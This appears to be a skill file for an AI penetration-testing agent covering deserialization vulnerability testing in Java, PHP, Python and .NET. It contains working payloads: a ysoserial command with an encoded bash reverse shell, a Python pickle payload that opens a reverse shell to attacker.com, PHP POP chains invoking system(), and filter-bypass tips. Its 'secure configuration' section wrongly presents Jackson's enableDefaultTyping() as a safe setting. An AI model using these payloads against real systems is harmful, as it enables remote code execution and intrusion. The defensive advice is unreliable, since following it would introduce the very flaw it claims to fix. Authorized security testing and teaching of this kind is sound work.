---
name: deserialization-testing
description: Specialized skill and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization Vulnerability Testing

## Overview

A deserialization vulnerability is a flaw caused by an application deserializing untrusted data, which can lead to remote code execution, denial of service, and more. This skill provides methods for detecting, exploiting, and defending against deserialization vulnerabilities.

## Vulnerability Principle

When an application deserializes serialized data back into objects, if the data comes from an untrusted source, an attacker can craft malicious serialized data to execute arbitrary code during the deserialization process.

## Common Formats

### Java

**Common libraries:**
- Java native serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common classes:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Testing Methodology

### 1. Identify Serialized Data

**Java serialization signatures:**
```
AC ED 00 05 (hexadecimal)
rO0 (Base64)
```

**PHP serialization signatures:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle signature:**
```
\x80\x03
```

### 2. Detect Deserialization Points

**Common locations:**
- Cookie values
- Session data
- API parameters
- File uploads
- Cache data
- Message queues

### 3. Java Deserialization

**Apache Commons Collections exploitation:**
```java
// Use ysoserial to generate the payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP Deserialization

**Basic test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic method exploitation:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Exploitation Techniques

### Java RCE

**Using ysoserial:**
```bash
# Generate the payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 encode
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Build a malicious object using a gadget chain
// Refer to the ysoserial source code
```

### PHP RCE

**Exploiting a POP chain:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass Techniques

### Encoding Bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Encoded: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter Bypass

**Use different gadget chains:**
- If CommonsCollections is filtered, try Spring
- If one version is filtered, try another version

### Class Name Obfuscation

**Using reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tool Usage

### ysoserial

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate the payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generate Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available gadgets
./phpggc -l

# Generate the payload
./phpggc Monolog/RCE1 system id

# Generate an encoded payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept a request containing serialized data
2. Use a plugin to generate the payload
3. Replace the original data
4. Observe the response

## Validation and Reporting

### Validation Steps

1. Confirm you can control the serialized data
2. Verify that deserialization triggers code execution
3. Assess the impact (RCE, data leakage, etc.)
4. Document a complete PoC
5. Record the confirmed vulnerability in the platform through the `report_finding` tool (the only entry point for logging vulnerabilities on this platform), with fields covering location, type, severity, reproduction steps/PoC, and remediation advice

### Key Reporting Points

- Vulnerability location and serialized data format
- Gadget chain used or exploitation method
- Complete exploitation steps and PoC
- Remediation advice (input validation, use of safe serialization, etc.)

## Defensive Measures

### Recommended Solutions

1. **Avoid deserializing untrusted data**
   - Use JSON instead
   - Use a safe serialization format

2. **Input validation**
   ```java
   // Whitelist allowed class names
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // Validate the class name
       // ...
   }
   ```

3. **Use a secure configuration**
   ```java
   // Jackson configuration
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **Class loader isolation**
   - Use a custom ClassLoader
   - Restrict which classes can be loaded

5. **Monitoring and logging**
   - Log deserialization operations
   - Monitor for anomalous behavior

## Notes

- Only perform this in an authorized test environment
- Be aware of gadget chain differences across library versions
- Mind payload size limits when testing
- Know the dependency library versions of the target application
